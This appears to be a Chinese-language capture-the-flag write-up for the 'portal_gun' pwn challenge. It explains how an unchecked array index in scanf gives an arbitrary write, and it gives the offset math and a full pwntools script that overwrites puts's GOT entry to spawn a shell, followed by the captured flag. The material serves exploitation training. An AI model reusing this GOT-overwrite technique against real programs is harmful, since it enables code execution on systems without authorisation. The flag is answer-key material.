# Writeup：portal_gun（陣列索引無邊界檢查 → 任意位址 8-byte 寫入 → 蓋 GOT → ret2win）

> 目標檔案：[portal_gun](portal_gun)
> 遠端：`nc ctf.adl.tw 10008`（**已實際連線驗證成功，一次就拿到 flag**）
> 分類：Binary Exploitation / pwn
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/找字串/算 index，輸出見 [disasm_output.txt](disasm_output.txt)）、[portal_gun_solve.py](portal_gun_solve.py)（最終 exploit）
>
> ```
> Flag: ADLCTF{n1n3_m0r3_s34s0ns_unt1l_1_g3t_th4t_sz3chu4n_s4uc3}
> ```

這題（Rick and Morty 主題：szechuan sauce、dimension、portal fluid）完全沒有 stack overflow——漏洞是**陣列索引沒有邊界檢查**，讓攻擊者可以把一個「陣列寫入」操作，變成「任意位址的 8-byte 寫入」。手法簡單直接，一次連線就解完。

---

## 1. 初步偵查

```bash
file portal_gun
```
```
portal_gun: ELF 64-bit LSB executable, x86-64, ... dynamically linked, ... not stripped
```

```bash
checksec --file=portal_gun
```
```
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

**Partial RELRO**（不是 Full RELRO）是這題的關鍵提示——代表 **GOT（Global Offset Table）是可以被寫入的**。配合 No PIE（GOT 位址寫死、固定），只要能找到任意位址寫入的手段，GOT 就是最好打的目標：蓋掉某個函式的 GOT 項，之後只要程式自己再呼叫一次那個函式，就會被劫持到我們要的位址。

## 2. 列出 symbol table

```python
from pwn import ELF
e = ELF('portal_gun', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if name:
        print(hex(addr), name)
```

跟前面幾題同樣的模式：

```
0x4010e4 execve / plt.execve      ← 又是手動 import 的危險函式
0x40125b szechuan_sauce           ← 風格突兀的函式名，win function 候選
0x4040a0 dimensions               ← .bss 裡一個全域陣列，題目主題（"尋找正確的維度座標"）
```

## 3. 反組譯 `szechuan_sauce()`：確認 win function

```asm
0x401263: lea rax,[rip+0xd9e]   ; "Great, another stupid shell, but WHERE IS THE SAUCE, MORTY?!"
0x40126a: mov rsi, rax
0x40126d: lea rax,[rip+0xdd1]   ; "%s"
0x401274: mov rdi, rax
0x40127c: call printf            ; printf("%s", 那句台詞)
0x401281: mov edi, 0xa
0x401286: call putchar           ; putchar('\n')
0x40128b: mov edx, 0
0x401290: mov esi, 0
0x401295: lea rax,[rip+0xdac]   ; "/bin/sh"
0x40129c: mov rdi, rax
0x40129f: call execve            ; execve("/bin/sh", NULL, NULL)
```

確認：`szechuan_sauce()`（固定位址 `0x40125b`）印一句台詞後，直接 `execve("/bin/sh", NULL, NULL)`——跟前幾題一樣的現成 win function。這個函式在正常流程裡**完全沒有被呼叫過**。

## 4. 反組譯 `main()`：真正的漏洞

```c
int n;                                  // rbp-0xc

puts("Listen Morty... *burp* find the right dimension coordinate!");
printf("Enter dimension index: ");
scanf("%d", &n);                        // 讀使用者輸入的「維度索引」，完全沒有範圍限制

if (n == 0x89 || n == -0x89) {          // 只是彩蛋判斷，不是邊界檢查！
    puts("Oh great, Dimension C-137... try not to blow this one up, Morty.");
}

printf("Insert portal fluid calibration frequency: ");
scanf("%lld", &dimensions[n]);          // <-- 關鍵：把使用者輸入的 8-byte 值，
                                         //     寫進 dimensions_base + n*8 這個位址

puts("I don't like your unemployed genes in my grandchildren, Jerry!");
```

乍看之下 `if (n == 0x89 ...)` 那段很像是某種驗證邏輯，但實際上**兩個分支最後都會走到同一段程式碼**——它只是會多印一句彩蛋台詞（"Dimension C-137" 是 Rick and Morty 劇中的梗），**完全不會擋下任何 `n` 的值，也不會讓程式提前結束**。

真正關鍵的一行是：

```asm
0x401341: mov eax, [rbp-0xc]      ; eax = n
0x401344: cdqe                     ; 符號擴展成 64-bit (rax = n，可正可負)
0x401346: lea rdx, [rax*8]        ; rdx = n * 8
0x40134e: lea rax, [rip+0x2d4b]   ; rax = &dimensions（固定位址 0x4040a0，No PIE）
0x401355: add rax, rdx             ; rax = &dimensions + n*8 = &dimensions[n]
0x401358: mov rsi, rax
...
0x40136a: call __isoc99_scanf     ; scanf("%lld", &dimensions[n])
```

`n` 是一個**完全沒有邊界檢查、可正可負的 32-bit 整數**，`&dimensions[n]` 這個位址計算 **沒有任何範圍限制**——這就是一個教科書等級的「**陣列索引濫用 → 任意位址寫入**」：只要我們能自由選 `n`，就能讓 `dimensions_base + n*8` 落在記憶體裡**任何我們想要、且剛好跟 `dimensions_base` 差 8 的倍數**的位址上。而且第二個 `scanf` 用的格式是 **`%lld`**（64-bit），寫入的是完整 8 bytes，剛好可以把一個函式指標整個蓋掉。

## 5. 攻擊思路：蓋 GOT

**Partial RELRO** 代表 GOT 可寫。`main()` 結尾還會呼叫一次 `puts()`（印最後那句台詞），這是個現成的「觸發點」——只要我們能在這次呼叫之前，把 `puts` 的 GOT 項改成 `szechuan_sauce()` 的位址，這次 `puts()` 呼叫就會變成跳去執行 `szechuan_sauce()`。

### 算 index

```
dimensions_base = 0x4040a0
got.puts        = 0x404020

n = (got.puts - dimensions_base) / 8
  = (0x404020 - 0x4040a0) / 8
  = -128 / 8
  = -16
```

驗證：`dimensions_base + (-16)*8 = 0x4040a0 - 0x80 = 0x404020`，正好等於 `got.puts`。

### 要寫入的值

```
szechuan_sauce() 的位址 = 0x40125b = 4199003（十進位）
```

## 6. 完整 Exploit Script

```python
from pwn import *

e = ELF('portal_gun', checksec=False)

WIN_FUNC = 0x40125b
GOT_PUTS = e.got['puts']
DIMENSIONS_BASE = e.symbols['dimensions']
INDEX = (GOT_PUTS - DIMENSIONS_BASE) // 8   # -16

p = remote('ctf.adl.tw', 10008, timeout=10)

p.recvuntil(b'Enter dimension index: ')
p.sendline(str(INDEX).encode())             # n = -16

p.recvuntil(b'Insert portal fluid calibration frequency: ')
p.sendline(str(WIN_FUNC).encode())          # 把 got.puts 蓋成 szechuan_sauce 的位址

p.interactive()
```

### 執行流程

1. 送 `n = -16`，決定接下來的寫入目標是 `dimensions_base - 128 = got.puts`。
2. 送 `4199003`（`szechuan_sauce` 的位址），`scanf("%lld", &dimensions[-16])` 把這個值整個寫進 `got.puts`。
3. `main()` 結尾呼叫 `puts("I don't like your unemployed genes...")`——程式透過 PLT 跳到 `got.puts` 裡存的位址，但這個位址現在已經被我們蓋成 `szechuan_sauce()` 了，於是直接跳過去執行，`execve("/bin/sh", NULL, NULL)`，拿到 shell。

### 實際連線結果

```
Great, another stupid shell, but WHERE IS THE SAUCE, MORTY?!
uid=1000(portal_gun) gid=1000(portal_gun) groups=1000(portal_gun)
```

（`puts("Great, another stupid shell...")` 正是 `szechuan_sauce()` 一開始印的那句台詞——確認劫持成功，而不是正常印出 `main()` 原本那句 "I don't like your unemployed genes..."。）

```
find / -iname "*flag*" 2>/dev/null
# -> /home/portal_gun/flag
cat /home/portal_gun/flag
# -> ADLCTF{n1n3_m0r3_s34s0ns_unt1l_1_g3t_th4t_sz3chu4n_s4uc3}
```

一次連線、一次 payload 就成功，沒有遇到任何需要除錯的地方——整個攻擊路徑非常乾淨。

---

## 重點整理

- **漏洞本質跟前面所有「overflow 系」題目完全不同**：這題沒有任何緩衝區溢位，漏洞是 `scanf("%lld", &dimensions[n])` 裡的 **`n` 沒有邊界檢查**。只要陣列索引可以由使用者自由控制、又沒有範圍限制，「陣列寫入」就能被濫用成「任意位址寫入」——這是一種跟 stack/heap overflow 平行、但同樣常見的漏洞類型（有時稱為 **arbitrary write / out-of-bounds write via unchecked index**）。
- **看起來像驗證的程式碼不一定真的在驗證**：`if (n == 0x89 || n == -0x89)` 這段很容易讓人誤以為是某種邊界檢查，但實際追蹤兩個分支後會發現它們最終都走到同一段漏洞程式碼——花時間看清楚「每個分支最後都去哪裡」比憑直覺猜測更可靠。
- **Partial RELRO + No PIE 是這類任意寫入漏洞的理想攻擊環境**：GOT 可寫（Partial RELRO）又位址固定（No PIE），只要有辦法控制寫入的位址跟內容，蓋 GOT 幾乎是標準答案，不需要額外 leak 任何位址。
- **善用「程式本來就會再呼叫一次」的函式當觸發點**：不需要自己找機會呼叫被蓋的函式——`main()` 自己結尾就會呼叫 `puts()` 印最後一句台詞，直接把這個「既有的呼叫」當成觸發劫持的時機，完全不需要額外操作。
- **解題思路順序**：`file`/`checksec` 初步偵查，特別留意 **Partial RELRO**（GOT 可寫的信號）→ 列 symbol table 找到 `execve` import + `szechuan_sauce` 這個可疑函式，確認是 win function → 反組譯 `main()`，注意到一段「看似驗證、實則無效」的分支 → 追到真正的漏洞行：`scanf("%lld", &dimensions[n])` 裡 `n` 完全沒有邊界檢查 → 想到用這個任意寫入去蓋 GOT，選一個 `main()` 之後還會被呼叫到的函式（`puts`）當目標 → 算出 index、算出要寫入的 win function 位址 → 連線送出兩個數字，拿到 shell、找 flag。
